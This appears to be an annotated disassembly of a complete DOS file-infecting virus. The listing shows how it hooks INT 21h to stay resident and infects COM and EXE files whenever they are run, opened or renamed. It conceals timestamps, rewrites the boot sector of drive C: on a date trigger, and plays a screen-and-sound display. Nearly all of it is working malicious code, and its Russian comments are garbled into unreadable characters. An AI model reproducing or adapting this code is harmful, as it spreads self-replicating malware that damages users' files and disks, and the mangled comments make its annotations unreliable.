

0000 2E56532E00       ".VS."
0005 8CC3           MOV       BX,ES
0007 83C310         ADD       BX,+10
000A 2E039C3C07     ADD       BX,CS:[SI+73C]
000F 2E899C3200     MOV       Word Ptr CS:[SI+0032],BX
0014 2E8B9C3A07     MOV       BX,Word Ptr CS:[SI+073A]
0019 2E899C3000     MOV       Word Ptr CS:[SI+0030],BX
001E 8CC3           MOV       BX,ES
0020 83C310         ADD       BX,+10
0023 2E039C4007     ADD       BX,Word Ptr CS:[SI+0740]
0028 8ED3           MOV       SS,BX
002A 2E8BA43E07     MOV       SP,Word Ptr CS:[SI+073E]
002F EA00000000     JMP       0000:0000
                                                *** COM Continue ***
0034 BF0001         MOV       DI,0100
0037 81C64207       ADD       SI,0742
003B A4             MOVSB
003C A5             MOVSW
003D 8B260600       MOV       SP,Word Ptr [0006]
0041 33DB           XOR       BX,BX
0043 53             PUSH      BX
0044 FF64F5         JMP       Word Ptr [SI-0B]
0047 0007           ADD       Byte Ptr [BX],AL
                                                *** ENTRY POINT ***
0049 E80000         CALL      004C
004C 5E             POP       SI
004D 83EE4C         SUB       SI,+4C
0050 FC             CLD
0051 2E81BC42074D5A CMP       Word Ptr CS:[SI+0742],5A4D
0058 740E           JZ        0068                    => EXE
005A FA             CLI
005B 8BE6           MOV       SP,SI
005D 81C4FC08       ADD       SP,08FC
0061 FB             STI
0062 3B260600       CMP       SP,Word Ptr [0006]
0066 73CC           JNB       0034                    => ­¥à¢ë
0068 2EC6847600C5   MOV       Byte Ptr CS:[SI+0076],C5
006E 50             PUSH      AX
006F 06             PUSH      ES
0070 56             PUSH      SI
0071 1E             PUSH      DS
0072 0E             PUSH      CS
0073 1F             POP       DS
0074 B800C5         MOV       AX,C500
0077 CD21           INT       21
0079 3D3167         CMP       AX,6731
007C 7504           JNZ       0082                    => ¥é¥ ­¥ ¢ à¥§¨¤¥­â¥
007E 07             POP       ES
007F E9AB00         JMP       012D                    =>
0082 07             POP       ES
0083 B449           MOV       AH,49                   Free Memory
0085 CD21           INT       21
0087 BBFFFF         MOV       BX,FFFF
008A B448           MOV       AH,48                   Allocate Memory
008C CD21           INT       21
008E 81EBE800       SUB       BX,00E8
0092 7303           JNB       0097
0094 E99600         JMP       012D                    => ¬ «® ¯ ¬ïâ¨
0097 8CC1           MOV       CX,ES
0099 F9             STC
009A 13CB           ADC       CX,BX
009C B44A           MOV       AH,4A                   Modify - ¢§ï«¨ ¢á¥, ¬¨­ãá …8
009E CD21           INT       21
00A0 BBE700         MOV       BX,00E7
00A3 F9             STC
00A4 26191E0200     SBB       Word Ptr ES:[0002],BX   ã¬¥­ìè¨«¨ ¢ PSP
00A9 06             PUSH      ES
00AA 8EC1           MOV       ES,CX
00AC B44A           MOV       AH,4A                   ¢§ï«¨ ­  å¢®áâ¥
00AE CD21           INT       21
00B0 8CC0           MOV       AX,ES
00B2 48             DEC       AX
00B3 8ED8           MOV       DS,AX
00B5 C70601000800   MOV       Word Ptr [0001],0008    Owner = System
00BB E8E105         CALL      069F                    * 10h
00BE 8BD8           MOV       BX,AX
00C0 8BCA           MOV       CX,DX
00C2 1F             POP       DS                      PSP address
00C3 8CD8           MOV       AX,DS
00C5 E8D705         CALL      069F                    * 10h
00C8 03060600       ADD       AX,Word Ptr [0006]      + "Available memory"
00CC 83D200         ADC       DX,+00
00CF 2BC3           SUB       AX,BX
00D1 1BD1           SBB       DX,CX
00D3 7204           JB        00D9
00D5 29060600       SUB       Word Ptr [0006],AX
00D9 1E             PUSH      DS
00DA 0E             PUSH      CS
00DB 2EC684F50062   MOV       Byte Ptr CS:[SI+00F5],62
00E1 33FF           XOR       DI,DI
00E3 8EDF           MOV       DS,DI                   ???
00E5 1F             POP       DS                      DS=CS
00E6 B99507         MOV       CX,0795                 áª®¯¨à®¢ «¨ ¢ à¥§¨¤¥­â
00E9 90             NOP                               |
00EA F3A4           REP       MOVSB                   |
00EC 26C70649070000 MOV       Word Ptr ES:[0749],0000
00F3 B80062         MOV       AX,6200
00F6 CD21           INT       21
00F8 8EDB           MOV       DS,BX                   PSP Address
00FA 8B3E0800       MOV       DI,Word Ptr [0008]      DOS Segment
00FE 8BDF           MOV       BX,DI
0100 8B3E0600       MOV       DI,Word Ptr [0006]      DOS Entry Displacement
0104 47             INC       DI
0105 8EDB           MOV       DS,BX
0107 8B5D02         MOV       BX,Word Ptr [DI+02]
010A 8B3D           MOV       DI,Word Ptr [DI]
010C 83C71A         ADD       DI,+1A
010F 26891E9307     MOV       Word Ptr ES:[0793],BX   DOS Segment
0114 8CC1           MOV       CX,ES
0116 8EC3           MOV       ES,BX
0118 FA             CLI
0119 B8EA00         MOV       AX,00EA                 "JMP Far"
011C AA             STOSB
011D B83803         MOV       AX,0338
0120 AB             STOSW
0121 8BC1           MOV       AX,CX
0123 AB             STOSW
0124 8EC1           MOV       ES,CX
0126 26893E9107     MOV       Word Ptr ES:[0791],DI
012B FB             STI
012C 07             POP       ES

012D B8002A         MOV       AX,2A00                 Get System Date
0130 CD21           INT       21
0132 3AD6           CMP       DL,DH
0134 7414           JZ        014A                    => Day=Month
0136 E98D00         JMP       01C6
0139 "ibm@@SNS         "
014A 0E             PUSH      CS
014B 1F             POP       DS                      DS=CS
014C 5E             POP       SI
014D 56             PUSH      SI                      Base Address
014E 2EC6846801CD   MOV       Byte Ptr CS:[SI+0168],CD
0154 B002           MOV       AL,02                   Drive "C:"
0156 B90100         MOV       CX,0001                 1 sector
0159 33D2           XOR       DX,DX                   Sector 0
015B 2EC684690125   MOV       Byte Ptr CS:[SI+0169],25
0161 8BDE           MOV       BX,SI
0163 81C32603       ADD       BX,0326                 Buffer address
0167 56             PUSH      SI
0168 2D4C5A         SUB       AX,5A4C (int 25 / pop dx) Read Sector
016B 5E             POP       SI
016C 7258           JB        01C6                    => Read Error
016E 06             PUSH      ES
016F 1E             PUSH      DS
0170 07             POP       ES
0171 2EC684B10126   MOV       Byte Ptr CS:[SI+01B1],26 Make
0177 2EC684B001CD   MOV       Byte Ptr CS:[SI+01B0],CD  int 26
017D 8BFB           MOV       DI,BX
017F 81C7F301       ADD       DI,01F3
0183 56             PUSH      SI
0184 8BF3           MOV       SI,BX
0186 83C60B         ADD       SI,+0B                  Boot parameter table
0189 B90900         MOV       CX,0009
018C 833C00         CMP       Word Ptr [SI],+00
018F 7416           JZ        01A7
0191 F3A4           REP       MOVSB                   áª®¯¨à®¢ «¨ ¢ 1F3
0193 5E             POP       SI
0194 8BFB           MOV       DI,BX
0196 83C703         ADD       DI,+03
0199 56             PUSH      SI
019A 81C63901       ADD       SI,0139                 "ibm..."
019E B91100         MOV       CX,0011
01A1 AC             LODSB
01A2 2C20           SUB       AL,20
01A4 AA             STOSB
01A5 E2FA           LOOP      01A1                    ¯¥à¥á« «¨
01A7 5E             POP       SI
01A8 56             PUSH      SI
01A9 33D2           XOR       DX,DX                   Sector 0
01AB B002           MOV       AL,02                   Drive "C:"
01AD B90100         MOV       CX,0001                 1 sector
01B0 0C1B           OR        AL,1B     (int 26)      Write
01B2 58             POP       AX
01B3 5E             POP       SI
01B4 07             POP       ES
01B5 720F           JB        01C6
01B7 0E             PUSH      CS
01B8 1F             POP       DS
01B9 58             POP       AX
01BA 1F             POP       DS
01BB B803C5         MOV       AX,C503
01BE CD21           INT       21
01C0 58             POP       AX
01C1 B8004C         MOV       AX,4C00                 EXIT
01C4 CD21           INT       21
01C6 5E             POP       SI
01C7 07             POP       ES
01C8 58             POP       AX
01C9 06             PUSH      ES
01CA 1F             POP       DS
01CB 2E81BC42074D5A CMP       Word Ptr CS:[SI+0742],5A4D
01D2 7503           JNZ       01D7
01D4 E92EFE         JMP       0005
01D7 E95AFE         JMP       0034
                                        *** INT 1C ENTRY ***
01DA 50             PUSH      AX
01DB 53             PUSH      BX
01DC 51             PUSH      CX
01DD 52             PUSH      DX
01DE 56             PUSH      SI
01DF 57             PUSH      DI
01E0 06             PUSH      ES
01E1 1E             PUSH      DS
01E2 0E             PUSH      CS
01E3 1F             POP       DS
01E4 803E390701     CMP       Byte Ptr [0739],01
01E9 752A           JNZ       0215
01EB B80300         MOV       AX,0003
01EE CD10           INT       10
01F0 C606350709     MOV       Byte Ptr [0735],09
01F5 C606380700     MOV       Byte Ptr [0738],00
01FA C606360700     MOV       Byte Ptr [0736],00
01FF C606370700     MOV       Byte Ptr [0737],00
0204 C606330700     MOV       Byte Ptr [0733],00
0209 C606390700     MOV       Byte Ptr [0739],00
020E 90             NOP
020F C7063107D206   MOV       Word Ptr [0731],06D2
0215 803E330701     CMP       Byte Ptr [0733],01
021A 7503           JNZ       021F
021C E9D500         JMP       02F4
021F 803E300700     CMP       Byte Ptr [0730],00
0224 7407           JZ        022D
0226 FE0E3007       DEC       Byte Ptr [0730]
022A E9C700         JMP       02F4
022D 8B1E3107       MOV       BX,Word Ptr [0731]
0231 833FFF         CMP       Word Ptr [BX],-01
0234 7513           JNZ       0249
0236 E461           IN        AL,61
0238 24FC           AND       AL,FC
023A E661           OUT       61,AL
023C C606340700     MOV       Byte Ptr [0734],00
0241 C606330701     MOV       Byte Ptr [0733],01
0246 E9AB00         JMP       02F4
0249 803E340701     CMP       Byte Ptr [0734],01
024E 7503           JNZ       0253
0250 E99200         JMP       02E5
0253 B0B6           MOV       AL,B6
0255 E643           OUT       43,AL
0257 8A4702         MOV       AL,Byte Ptr [BX+02]
025A A23007         MOV       Byte Ptr [0730],AL
025D C606340701     MOV       Byte Ptr [0734],01
0262 8B1F           MOV       BX,Word Ptr [BX]
0264 B8DD34         MOV       AX,34DD
0267 BA1200         MOV       DX,0012
026A F7F3           DIV       BX
026C E642           OUT       42,AL
026E 8AC4           MOV       AL,AH
0270 E642           OUT       42,AL
0272 E461           IN        AL,61
0274 0C03           OR        AL,03
0276 E661           OUT       61,AL
0278 8306310703     ADD       Word Ptr [0731],+03
027D 8A363707       MOV       DH,Byte Ptr [0737]
0281 8D36A506       LEA       SI,Word Ptr [06A5]
0285 B90300         MOV       CX,0003
0288 803E35070F     CMP       Byte Ptr [0735],0F
028D 7E09           JLE       0298
028F C606350709     MOV       Byte Ptr [0735],09
0294 90             NOP
0295 EB0E           JMP       02A5
0297 90             NOP
0298 803E350709     CMP       Byte Ptr [0735],09
029D 7306           JNB       02A5
029F C60635070F     MOV       Byte Ptr [0735],0F
02A4 90             NOP
02A5 8A1E3507       MOV       BL,Byte Ptr [0735]
02A9 8A163607       MOV       DL,Byte Ptr [0736]
02AD E84D00         CALL      02FD
02B0 FEC6           INC       DH
02B2 E2F1           LOOP      02A5
02B4 8006360702     ADD       Byte Ptr [0736],02
02B9 803E380701     CMP       Byte Ptr [0738],01
02BE 7419           JZ        02D9
02C0 803E370715     CMP       Byte Ptr [0737],15
02C5 770C           JA        02D3
02C7 8006370702     ADD       Byte Ptr [0737],02
02CC FE063507       INC       Byte Ptr [0735]
02D0 EB22           JMP       02F4
02D2 90             NOP
02D3 C606380701     MOV       Byte Ptr [0738],01
02D8 90             NOP
02D9 802E370702     SUB       Byte Ptr [0737],02
02DE FE0E3507       DEC       Byte Ptr [0735]
02E2 EB10           JMP       02F4
02E4 90             NOP
02E5 8A07           MOV       AL,Byte Ptr [BX]
02E7 A23007         MOV       Byte Ptr [0730],AL
02EA C606340700     MOV       Byte Ptr [0734],00
02EF 8306310701     ADD       Word Ptr [0731],+01
02F4 1F             POP       DS
02F5 07             POP       ES
02F6 5F             POP       DI
02F7 5E             POP       SI
02F8 5A             POP       DX
02F9 59             POP       CX
02FA 5B             POP       BX
02FB 58             POP       AX
02FC CF             IRET
02FD 51             PUSH      CX
02FE B700           MOV       BH,00
0300 B402           MOV       AH,02
0302 CD10           INT       10
0304 B90100         MOV       CX,0001
0307 AC             LODSB
0308 0AC0           OR        AL,AL
030A 7418           JZ        0324
030C 2C20           SUB       AL,20
030E 3CDF           CMP       AL,DF
0310 7404           JZ        0316
0312 3CDC           CMP       AL,DC
0314 7506           JNZ       031C
0316 B92200         MOV       CX,0022
0319 80C221         ADD       DL,21
031C B409           MOV       AH,09
031E CD10           INT       10
0320 FEC2           INC       DL
0322 EBDC           JMP       0300
0324 59             POP       CX
0325 C3             RET

0326 B003           MOV       AL,03     *** INT 24 ENTRY ***
0328 CF             IRET
                                        *** EXEC (4B00) ***
0329 E83901         CALL      0465                    ‡ à § 
032C E84903         CALL      0678
032F 9D             POPF
0330 80FC68         CMP       AH,68
0333 2EFF2E9107     JMP       DWord Ptr CS:[0791]     à®¤®«¦¥­¨¥ INT 21

                                        *** INT 21 ENTRY ***
0338 55             PUSH      BP
0339 8BEC           MOV       BP,SP
033B FF7606         PUSH      Word Ptr [BP+06]
033E 9D             POPF
033F 5D             POP       BP
0340 9C             PUSHF
0341 FC             CLD
0342 3D004B         CMP       AX,4B00
0345 74E2           JZ        0329
0347 80FC3C         CMP       AH,3C                   Create File
034A 740A           JZ        0356
034C 80FC3E         CMP       AH,3E                   Close File
034F 744A           JZ        039B
0351 80FC5B         CMP       AH,5B                   Create New File
0354 756F           JNZ       03C5                                   |
0356 2E833E490700   CMP       Word Ptr CS:[0749],+00                 V
035C 7403           JZ        0361
035E E9A600         JMP       0407
0361 E8B900         CALL      041D
0364 7403           JZ        0369                    => EXE or COM
0366 E99E00         JMP       0407
0369 E80C03         CALL      0678
036C 9D             POPF
036D E8EB00         CALL      045B (int 21)
0370 7303           JNB       0375
0372 E99900         JMP       040E
0375 9C             PUSHF
0376 06             PUSH      ES
0377 0E             PUSH      CS
0378 07             POP       ES
0379 56             PUSH      SI
037A 57             PUSH      DI
037B 51             PUSH      CX
037C 50             PUSH      AX
037D BF4907         MOV       DI,0749
0380 AB             STOSW
0381 8BF2           MOV       SI,DX
0383 B94100         MOV       CX,0041
0386 AC             LODSB
0387 AA             STOSB
0388 84C0           TEST      AL,AL
038A 7407           JZ        0393
038C E2F8           LOOP      0386
038E 26890E4907     MOV       Word Ptr ES:[0749],CX
0393 58             POP       AX
0394 59             POP       CX
0395 5F             POP       DI
0396 5E             POP       SI
0397 07             POP       ES
0398 9D             POPF
0399 7373           JNB       040E
039B 2E3B1E4907     CMP       BX,Word Ptr CS:[0749]
03A0 7565           JNZ       0407
03A2 85DB           TEST      BX,BX
03A4 7461           JZ        0407
03A6 E8CF02         CALL      0678
03A9 9D             POPF
03AA E8AE00         CALL      045B (int 21)
03AD 725F           JB        040E
03AF 9C             PUSHF
03B0 1E             PUSH      DS
03B1 0E             PUSH      CS
03B2 1F             POP       DS
03B3 52             PUSH      DX
03B4 BA4B07         MOV       DX,074B
03B7 E8AB00         CALL      0465                    ‡ à § 
03BA 2EC70649070000 MOV       Word Ptr CS:[0749],0000
03C1 5A             POP       DX
03C2 1F             POP       DS
03C3 EBD3           JMP       0398
03C5 80FC3D         CMP       AH,3D                   Open File
03C8 7435           JZ        03FF
03CA 80FC43         CMP       AH,43                   Get or Set File Attributems
03CD 7430           JZ        03FF
03CF 80FC56         CMP       AH,56                   Rename File
03D2 742B           JZ        03FF
03D4 80FCC5         CMP       AH,C5                   OWN Call
03D7 752E           JNZ       0407
03D9 3C03           CMP       AL,03
03DB 7406           JZ        03E3
03DD B83167         MOV       AX,6731
03E0 EB37           JMP       0419
03E2 90             NOP
03E3 1E             PUSH      DS
03E4 B80000         MOV       AX,0000
03E7 8ED8           MOV       DS,AX
03E9 FA             CLI
03EA C7067000DA01   MOV       Word Ptr [0070],01DA    INT 1C
03F0 8C0E7200       MOV       Word Ptr [0072],CS
03F4 FB             STI
03F5 1F             POP       DS
03F6 2EC606390701   MOV       Byte Ptr CS:[0739],01
03FC EB1B           JMP       0419
03FE 90             NOP
                                *** Open, Rename, Attributes ***
03FF E81B00         CALL      041D
0402 7503           JNZ       0407                    => not EXE or COM
0404 E85E00         CALL      0465                    ‡ à § 
0407 E86E02         CALL      0678
040A 9D             POPF
040B E84D00         CALL      045B (int 21)
040E 9C             PUSHF
040F 1E             PUSH      DS
0410 E87002         CALL      0683
0413 C60600005A     MOV       Byte Ptr [0000],5A
0418 1F             POP       DS
0419 9D             POPF
041A CA0200         RETF      0002

041D 50             PUSH      AX                      ¯à®¢¥àª  ­  EXE ¨«¨ COM
041E 56             PUSH      SI
041F 8BF2           MOV       SI,DX
0421 AC             LODSB
0422 84C0           TEST      AL,AL
0424 7424           JZ        044A
0426 3C2E           CMP       AL,2E
0428 75F7           JNZ       0421                    ¯®¨áª ª®­æ  ¨«¨ â®çª¨
042A E82200         CALL      044F
042D 8AE0           MOV       AH,AL
042F E81D00         CALL      044F
0432 3D6F63         CMP       AX,636F                 "co"
0435 740C           JZ        0443
0437 3D7865         CMP       AX,6578                 "ex"
043A 7510           JNZ       044C
043C E81000         CALL      044F
043F 3C65           CMP       AL,65                   "e"
0441 EB09           JMP       044C
0443 E80900         CALL      044F
0446 3C6D           CMP       AL,6D                   "m"
0448 EB02           JMP       044C
044A FEC0           INC       AL
044C 5E             POP       SI
044D 58             POP       AX
044E C3             RET
044F AC             LODSB                             ¯à®¯¨á­ë¥ ¢ áâà®ç­ë¥
0450 3C43           CMP       AL,43
0452 7206           JB        045A
0454 3C59           CMP       AL,59
0456 7302           JNB       045A
0458 0420           ADD       AL,20
045A C3             RET

045B 9C             PUSHF                             Simulate INT 21
045C 80FC68         CMP       AH,68                   ¢¬¥áâ® § ¯®àç¥­­®© ª®¬ ­¤ë
045F 2EFF1E9107     CALL      DWord Ptr CS:[0791]     à®¤®«¦¥­¨¥ INT 21
0464 C3             RET

0465 1E             PUSH      DS
0466 06             PUSH      ES
0467 56             PUSH      SI
0468 57             PUSH      DI
0469 50             PUSH      AX
046A 53             PUSH      BX
046B 51             PUSH      CX
046C 52             PUSH      DX
046D 8CDE           MOV       SI,DS
046F 33C0           XOR       AX,AX
0471 8ED8           MOV       DS,AX
0473 C4069000       LES       AX,DWord Ptr [0090]
0477 06             PUSH      ES
0478 50             PUSH      AX                      Save INT 24
0479 C70690002603   MOV       Word Ptr [0090],0326
047F 8C0E9200       MOV       Word Ptr [0092],CS      Set INT 24
0483 8EDE           MOV       DS,SI
0485 33C9           XOR       CX,CX
0487 B80043         MOV       AX,4300                 Get Attributes
048A E8CEFF         CALL      045B (int 21)
048D 8BD9           MOV       BX,CX
048F 80E1FE         AND       CL,FE
0492 3ACB           CMP       CL,BL
0494 7407           JZ        049D
0496 B80143         MOV       AX,4301                 Set Attributes
0499 E8BFFF         CALL      045B (int 21)
049C F9             STC
049D 9C             PUSHF
049E 1E             PUSH      DS
049F 52             PUSH      DX
04A0 53             PUSH      BX
04A1 B8023D         MOV       AX,3D02                 Open Write
04A4 E8B4FF         CALL      045B (int 21)
04A7 720A           JB        04B3
04A9 8BD8           MOV       BX,AX
04AB E82600         CALL      04D4                    ‡ à ¦¥­¨¥
04AE B43E           MOV       AH,3E                   Close
04B0 E8A8FF         CALL      045B (int 21)
04B3 59             POP       CX
04B4 5A             POP       DX
04B5 1F             POP       DS
04B6 9D             POPF
04B7 7306           JNB       04BF
04B9 B80143         MOV       AX,4301                 Reset Attributes
04BC E89CFF         CALL      045B (int 21)
04BF 33C0           XOR       AX,AX
04C1 8ED8           MOV       DS,AX
04C3 8F069000       POP       Word Ptr [0090]
04C7 8F069200       POP       Word Ptr [0092]         Reset INT 24
04CB 5A             POP       DX
04CC 59             POP       CX
04CD 5B             POP       BX
04CE 58             POP       AX
04CF 5F             POP       DI
04D0 5E             POP       SI
04D1 07             POP       ES
04D2 1F             POP       DS
04D3 C3             RET

04D4 0E             PUSH      CS
04D5 1F             POP       DS
04D6 0E             PUSH      CS
04D7 07             POP       ES
04D8 BA9507         MOV       DX,0795
04DB B91800         MOV       CX,0018
04DE B43F           MOV       AH,3F
04E0 E878FF         CALL      045B (int 21)                    Read Header
04E3 33C9           XOR       CX,CX
04E5 33D2           XOR       DX,DX
04E7 B80242         MOV       AX,4202                 Lseek on EOF
04EA E86EFF         CALL      045B (int 21)
04ED 8916AF07       MOV       Word Ptr [07AF],DX
04F1 3D000B         CMP       AX,0B00
04F4 83DA00         SBB       DX,+00
04F7 726C           JB        0565                    => short
04F9 A3AD07         MOV       Word Ptr [07AD],AX
04FC 813E95074D5A   CMP       Word Ptr [0795],5A4D    EXE?
0502 7517           JNZ       051B                    => COM
0504 A19D07         MOV       AX,Word Ptr [079D]      Header Size (+8)
0507 0306AB07       ADD       AX,Word Ptr [07AB]     +CS (+16)
050B E89101         CALL      069F                    * 10h
050E 0306A907       ADD       AX,Word Ptr [07A9]     +IP (+14)
0512 83D200         ADC       DX,+00
0515 8BCA           MOV       CX,DX
0517 8BD0           MOV       DX,AX                   CX:DX = Entry Point
0519 EB15           JMP       0530
051B 803E9507E9     CMP       Byte Ptr [0795],E9      "JMP"
0520 7544           JNZ       0566                    => not
0522 8B169607       MOV       DX,Word Ptr [0796]
0526 81C20301       ADD       DX,0103
052A 723A           JB        0566
052C FECE           DEC       DH
052E 33C9           XOR       CX,CX                   CX:DX = Entry Point
0530 B80042         MOV       AX,4200                 Lseek on Entry Point
0533 E825FF         CALL      045B (int 21)
0536 050007         ADD       AX,0700                +700h
0539 90             NOP
053A 83D200         ADC       DX,+00
053D 3B06AD07       CMP       AX,Word Ptr [07AD]      áà ¢­¨«¨
0541 7523           JNZ       0566                     á
0543 3B16AF07       CMP       DX,Word Ptr [07AF]        ¤«¨­®©
0547 751D           JNZ       0566                    => ­¥ § à ¦¥­
0549 BAB107         MOV       DX,07B1
054C 8BF2           MOV       SI,DX
054E B9EF02         MOV       CX,02EF
0551 B43F           MOV       AH,3F                   ¯à®ç¨â «¨ ªãá®ª ¨§ ­ ç «  ª®¤ 
0553 E805FF         CALL      045B (int 21)
0556 720E           JB        0566
0558 3BC8           CMP       CX,AX
055A 750A           JNZ       0566
055C BF4900         MOV       DI,0049
055F AC             LODSB
0560 AE             SCASB
0561 7503           JNZ       0566
0563 E2FA           LOOP      055F                    áà ¢­¨«¨
0565 C3             RET                               => á®¢¯ «®, ã¦¥ § à ¦¥­
0566 33C9           XOR       CX,CX
0568 33D2           XOR       DX,DX
056A B80242         MOV       AX,4202                 ¯®è«¨ ¢ ª®­¥æ
056D E8EBFE         CALL      045B (int 21)
0570 A34507         MOV       Word Ptr [0745],AX
0573 89164707       MOV       Word Ptr [0747],DX      § ¯®¬­¨«¨ ¤«¨­ã
0577 813E95074D5A   CMP       Word Ptr [0795],5A4D
057D 740A           JZ        0589                    => EXE
057F 059509         ADD       AX,0995
0582 90             NOP
0583 83D200         ADC       DX,+00
0586 7419           JZ        05A1                    => ¤®áâ â®ç­® ª®à®âª¨©
0588 C3             RET
                                                      EXE
0589 8B16AD07       MOV       DX,Word Ptr [07AD]      low word of length
058D F6DA           NEG       DL
058F 83E20F         AND       DX,+0F
0592 33C9           XOR       CX,CX
0594 B80142         MOV       AX,4201                 ®ªàã£«¨«¨ ¤«¨­ã
0597 E8C1FE         CALL      045B (int 21)
059A A3AD07         MOV       Word Ptr [07AD],AX
059D 8916AF07       MOV       Word Ptr [07AF],DX      § ¯®¬­¨«¨ ®ªàã£«¥­­ãî ¤«¨­ã
05A1 B80057         MOV       AX,5700    com & exe    Get file Date
05A4 E8B4FE         CALL      045B (int 21)
05A7 9C             PUSHF
05A8 51             PUSH      CX
05A9 52             PUSH      DX                      Save Date
05AA 813E95074D5A   CMP       Word Ptr [0795],5A4D
05B0 7405           JZ        05B7                    => EXE
05B2 B80001         MOV       AX,0100
05B5 EB07           JMP       05BE
05B7 A1A907         MOV       AX,Word Ptr [07A9]      IP (+14)
05BA 8B16AB07       MOV       DX,Word Ptr [07AB]      CS (+16)
05BE 2EC70647000007 MOV       Word Ptr CS:[0047],0700
05C5 BF3A07         MOV       DI,073A
05C8 AB             STOSW
05C9 8BC2           MOV       AX,DX
05CB AB             STOSW
05CC A1A507         MOV       AX,Word Ptr [07A5]      SP
05CF AB             STOSW
05D0 A1A307         MOV       AX,Word Ptr [07A3]      SS
05D3 AB             STOSW
05D4 BE9507         MOV       SI,0795                 3 ¯¥à¢ëå ¡ ©â 
05D7 A4             MOVSB
05D8 A5             MOVSW
05D9 33D2           XOR       DX,DX
05DB B94907         MOV       CX,0749
05DE 90             NOP
05DF B440           MOV       AH,40                   Write Virus
05E1 E877FE         CALL      045B (int 21)
05E4 7227           JB        060D
05E6 33C8           XOR       CX,AX
05E8 7523           JNZ       060D
05EA 8BD1           MOV       DX,CX
05EC B80042         MOV       AX,4200                 Lseek 0,0
05EF E869FE         CALL      045B (int 21)
05F2 813E95074D5A   CMP       Word Ptr [0795],5A4D
05F8 7415           JZ        060F                    => EXE
05FA C6069507E9     MOV       Byte Ptr [0795],E9
05FF A1AD07         MOV       AX,Word Ptr [07AD]
0602 054600         ADD       AX,0046
0605 A39607         MOV       Word Ptr [0796],AX      Make JMP Entry_Point
0608 B90300         MOV       CX,0003
060B EB57           JMP       0664
060D EB5D           JMP       066C
060F E88A00         CALL      069C     (exe)          <size of="" header="">*10h
0612 F7D0           NOT       AX
0614 F7D2           NOT       DX
0616 40             INC       AX
0617 7501           JNZ       061A
0619 42             INC       DX
061A 0306AD07       ADD       AX,Word Ptr [07AD]
061E 1316AF07       ADC       DX,Word Ptr [07AF]
0622 B91000         MOV       CX,0010
0625 F7F1           DIV       CX                      ¯®«ãç¨«¨ new CS
0627 C706A9074900   MOV       Word Ptr [07A9],0049    new IP
062D A3AB07         MOV       Word Ptr [07AB],AX      new CS
0630 057200         ADD       AX,0072
0633 A3A307         MOV       Word Ptr [07A3],AX      (+0E) SS
0636 C706A5070001   MOV       Word Ptr [07A5],0100    (+10) SP
063C 8106AD074907   ADD       Word Ptr [07AD],0749
0642 8316AF0700     ADC       Word Ptr [07AF],+00     ã¤«¨­¨«¨ ­  ¢¨àãá
0647 A1AD07         MOV       AX,Word Ptr [07AD]
064A 25FF01         AND       AX,01FF
064D A39707         MOV       Word Ptr [0797],AX      (+2)
0650 9C             PUSHF
0651 A1AE07         MOV       AX,Word Ptr [07AE]
0654 D02EB007       SHR       Byte Ptr [07B0],1
0658 D1D8           RCR       AX,1
065A 9D             POPF
065B 7401           JZ        065E
065D 40             INC       AX
065E A39907         MOV       Word Ptr [0799],AX      (+4)
0661 B91800         MOV       CX,0018
0664 BA9507         MOV       DX,0795  (com & exe)
0667 B440           MOV       AH,40                   Write start (3 or 18h)
0669 E8EFFD         CALL      045B (int 21)
066C 5A             POP       DX
066D 59             POP       CX
066E 9D             POPF
066F 7206           JB        0677
0671 B80157         MOV       AX,5701                 Reset Time
0674 E8E4FD         CALL      045B (int 21)
0677 C3             RET

0678 1E             PUSH      DS
0679 E80700         CALL      0683
067C C60600004D     MOV       Byte Ptr [0000],4D      "M"
0681 1F             POP       DS
0682 C3             RET

0683 50             PUSH      AX
0684 53             PUSH      BX
0685 B462           MOV       AH,62
0687 E8D1FD         CALL      045B (int 21)                    Get PSP
068A 8CC8           MOV       AX,CS
068C 48             DEC       AX
068D 4B             DEC       BX
068E 8EDB           MOV       DS,BX
0690 F9             STC
0691 131E0300       ADC       BX,Word Ptr [0003]
0695 3BD8           CMP       BX,AX
0697 72F5           JB        068E
0699 5B             POP       BX
069A 58             POP       AX
069B C3             RET

069C A19D07         MOV       AX,Word Ptr [079D]      Size of Header

069F BA1000         MOV       DX,0010
06A2 F7E2           MUL       DX
06A4 C3             RET

06A0  10 00 F7 E2 C3 FE FF FD 00 FE 40 75 73 73 72 40 ..........@ussr@
06B0  40 40 40 40 76 89 92 95 73 8F 86 94 40 40 48 83 @@@@v...s...@@H.
06C0  49 40 40 96 51 4E 40 51 59 59 50 40 FD 00 FE FC I@@.QN@QYYP@....
06D0  FD 00 4A 01 03 01 B8 01 0B 01 4A 01 06 01 72 01 ..J.......J...r.
06E0  01 02 9F 01 09 01 15 01 02 02 15 01 03 02 72 01 ..............r.
06F0  08 01 4A 01 05 02 26 01 01 01 4A 01 08 02 15 01 ..J...&...J.....
0700  03 02 15 01 03 03 26 01 08 02 26 01 05 01 4A 01 ......&...&...J.
0710  01 02 72 01 08 01 72 01 04 01 72 01 04 00 72 01 ..r...r...r...r.
0720  08 02 9F 01 06 02 B8 01 01 02 EE 01 0F FF FF FF ................
0730  00 00 00 01 00 00 00 00 00 00 86 1C 00 00 00 00 ................
0740  00 00 4D 5A 1A 1A 24 00 00 00 A3 B6 00 A3 A6 9E ..MZ..$......£¦ž
0750  A3 A4 9E A3 F0 A6 E9 57 02 8B 1E 42 09 80 3F FF .......W...B..?.
0760  75 4A 80 7F 01 57 75 44 C7 06 F0 A6 01 00 8B C3 uJ...WuD........


073A OLD IP
073C OLD CS
073E OLD SP
0740 OLD SS
0742 First 3 Bytes
0745 OLD File Length (Dword)

0795 Buffer for EXE Header
07AD OLD File Length (Dword), § â¥¬ ®ªàã£«¥­­ ï

</size>